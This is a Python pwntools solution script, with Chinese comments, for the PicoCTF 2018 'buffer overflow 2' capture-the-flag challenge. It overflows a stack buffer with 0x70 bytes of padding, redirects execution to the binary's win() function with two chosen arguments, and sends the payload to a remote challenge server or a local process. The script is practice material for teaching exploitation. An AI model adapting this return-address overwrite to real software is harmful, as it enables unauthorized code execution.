'''
@Author       : 白银
@Date         : 2023-05-20 14:57:16
@LastEditors  : 白银
@LastEditTime : 2023-05-23 08:41:16
@FilePath     : /pwn/PicoCTF_2018_buffer_overflow_2.py
@Description  : https://buuoj.cn/challenges#picoctf_2018_buffer%20overflow%202
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
# from libcfind import *

set_arch = 2 # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './PicoCTF_2018_buffer_overflow_2'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 27306)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        # libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        libc = ELF('/home/jack/Desktop/2.27x64libc.so.6')
    else:
        # libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        libc = ELF('/home/jack/Desktop/2.27x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    # libc = elf.libc
    # libc = ELF('/home/jack/Desktop/libc-2.23.so')
    libc = ELF('/home/jack/Desktop/2.27x86libc.so.6')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x70 # ida看，s上限和r差多少
win_a1 = 0xDEADBEEF # win()参数1
win_a2 = 0xDEADC0DE # win()参数2
flag_addr = 0x80485CB # win()函数地址

payload = flat(['a' * padding, flag_addr, 0xdeadbeef, win_a1, win_a2])

io.sendlineafter('Please enter your string: ', payload)

io.interactive()
